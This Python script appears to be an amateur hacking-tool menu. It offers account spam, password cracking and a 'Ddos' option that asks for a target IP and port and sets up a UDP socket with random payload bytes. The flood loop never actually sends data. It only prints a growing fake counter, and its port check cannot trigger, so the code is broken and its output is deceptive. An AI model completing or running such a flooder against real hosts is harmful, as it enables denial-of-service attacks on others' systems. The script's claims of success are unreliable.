import os,sys,time 
import socket 
import random 
import time
clear = lambda : os.system('clear')
clear()

print('''\033[95m _______   _____       ___  _______  _______ 
|       | |  _  |     |   ||   _   ||       |
|    ___| | |_| |     |   ||  |_|  ||  _____|
|   | __ |   _   |    |   ||       || |_____ 
|   ||  ||  | |  | ___|   ||       ||_____  |
|   |_| ||  |_|  ||       ||   _   | _____| |
|_______||_______||_______||__| |__||_______|

''')
print('''
1\ spam acc
2\ info acc
3\ crack password
4\ rest link
5\ vip
6\ dev info
7\ exit
8\ Ddos
''')
choos = input('ur choose :')
if choos == "1":
 print("sigin !")
 user = input('username :  ')
 print("wait...")
if choos == "8":
 print("Starting DDOS Attack")
 print("") 
 ip = input("Enter IP or Domain   :" )
 port = input("Enter Port :")
 print('')
 time.sleep(1.58)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 send = 0
 while True:
      send = send + 100000000000
      
      print ('\033[94m send',send,'to','\033[95m ip',ip,'\033[93m port',port)
      if port == 65534:
         port = 0

